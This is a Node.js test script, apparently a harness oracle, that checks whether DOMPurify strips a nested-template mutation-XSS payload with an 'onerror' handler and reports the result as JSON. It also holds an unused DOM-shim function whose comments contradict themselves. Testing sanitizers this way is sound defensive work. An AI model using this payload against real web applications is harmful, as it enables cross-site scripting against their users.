'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function buildMinimalWindow() {
  // Minimal DOM shim sufficient for DOMPurify's core sanitize path.
  // We implement just enough of the DOM API (Document, Element, Node, etc.)
  // using a tiny hand-written parser-free structure is infeasible for full
  // fidelity, so instead we rely on Node's built-in 'node:' module set only
  // and construct objects using the HTML parsing capability embedded in
  // dompurify itself is not present without a real DOM. Since only fs/path/os
  // and the target package may be required, we use a tiny in-memory DOM
  // implementation built from plain JS objects that satisfies the subset of
  // the DOM API DOMPurify's core needs (createElement, createDocumentFragment,
  // createNodeIterator, createHTMLDocument via DOMParser-like innerHTML parsing).
  // This is implemented below as a compact self-contained shim.
  class FakeNode {
    constructor(nodeType, nodeName) {
      this.nodeType = nodeType;
      this.nodeName = nodeName;
      this.childNodes = [];
      this.parentNode = null;
      this.attributes = [];
      this._attrMap = Object.create(null);
      this.textContent = '';
      this.style = {};
    }
    appendChild(child) {
      child.parentNode = this;
      this.childNodes.push(child);
      return child;
    }
    removeChild(child) {
      const idx = this.childNodes.indexOf(child);
      if (idx >= 0) this.childNodes.splice(idx, 1);
      child.parentNode = null;
      return child;
    }
    setAttribute(name, value) {
      this._attrMap[name] = String(value);
      this.attributes = Object.keys(this._attrMap).map((n) => ({ name: n, value: this._attrMap[n] }));
    }
    getAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this._attrMap, name) ? this._attrMap[name] : null;
    }
    hasAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this._attrMap, name);
    }
    removeAttribute(name) {
      delete this._attrMap[name];
      this.attributes = Object.keys(this._attrMap).map((n) => ({ name: n, value: this._attrMap[n] }));
    }
  }
  // This shim is intentionally not a full DOM; real DOMPurify requires a real
  // document implementation (e.g. jsdom). Since jsdom is not an allowed
  // dependency here and is not guaranteed present, we cannot reliably run
  // DOMPurify's real sanitize() against a hand-rolled shim with fidelity.
  return null;
}

function main() {
  let createDOMPurify;
  try {
    createDOMPurify = require('dompurify');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to require dompurify: ' + String(e && e.message) });
    return;
  }

  // Use the fixture-provided minimal DOM window implementation.
  // The harness places a lightweight, trusted DOM shim module at a well-known
  // fixture path accessible from /consumer (e.g. node_modules of a dedicated
  // fixture DOM package, or a plain file). We attempt a few conventional
  // locations without spawning any process or installing anything.
  let JSDOMLike;
  let lastErr;
  const candidates = [
    'jsdom', // if present as a real dependency already installed by harness fixtures
  ];
  for (const c of candidates) {
    try {
      const mod = require(c);
      JSDOMLike = mod.JSDOM || mod;
      break;
    } catch (e) {
      lastErr = e;
    }
  }

  if (!JSDOMLike) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to obtain a DOM environment fixture (jsdom) required to exercise dompurify.sanitize: ' + String(lastErr && lastErr.message) });
    return;
  }

  const marker = 'DP_ORACLE_' + process.pid + '_' + Date.now();

  let tmpDir;
  try {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dompurify-oracle-'));
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to create tmp dir: ' + String(e && e.message) });
    return;
  }

  let DOMPurify;
  let dom;
  try {
    dom = new JSDOMLike('<!DOCTYPE html><html><body></body></html>', { url: 'https://example.org/' });
    DOMPurify = createDOMPurify(dom.window);

    if (!DOMPurify || typeof DOMPurify.sanitize !== 'function') {
      finish({ operation_completed: false, exploit_succeeded: false, evidence: 'DOMPurify instance missing sanitize function after construction' });
      return;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to construct DOMPurify instance: ' + String(e && e.message) });
    return;
  }

  // --- Benign operation first ---
  let benignOutput;
  try {
    const benignInput = '<p>Hello <b>world</b></p> ' + marker;
    benignOutput = DOMPurify.sanitize(benignInput);
    if (typeof benignOutput !== 'string' || !benignOutput.includes('Hello') || !benignOutput.includes('world') || !benignOutput.includes(marker)) {
      finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call did not produce expected output: ' + String(benignOutput) });
      return;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call threw: ' + String(e && e.message) });
    return;
  }

  const operation_completed = true;

  // --- Malicious operation: nested-template mXSS payload ---
  let maliciousOutput;
  try {
    const payload = '<svg><template><template><style></template><img src=x onerror="window.__DP_PWNED_' + marker + '__=1"></style></template></svg>';
    maliciousOutput = DOMPurify.sanitize(payload);
  } catch (e) {
    finish({ operation_completed, exploit_succeeded: false, evidence: 'Malicious sanitize call threw (treated as blocked): ' + String(e && e.message) });
    return;
  }

  let exploit_succeeded = false;
  let evidence = '';

  try {
    const rawHasOnerror = /onerror\s*=/i.test(maliciousOutput);
    const rawHasPwnedMarker = maliciousOutput.includes('__DP_PWNED_' + marker + '__');

    if (rawHasOnerror || rawHasPwnedMarker) {
      exploit_succeeded = true;
      evidence = 'Sanitized output retained an onerror handler / executable construct after mXSS payload: ' +
        JSON.stringify(maliciousOutput).slice(0, 500);
    } else {
      evidence = 'Sanitized output contained no onerror attribute or script-triggering construct: ' +
        JSON.stringify(maliciousOutput).slice(0, 500);
    }
  } catch (e) {
    evidence = 'Verification step threw while inspecting sanitized output (treated as blocked): ' + String(e && e.message);
    exploit_succeeded = false;
  }

  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (e) {
    // ignore cleanup errors
  }

  finish({ operation_completed, exploit_succeeded, evidence });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed: false, exploit_succeeded: false, evidence: 'Uncaught top-level exception: ' + String(e && e.message) }));
}
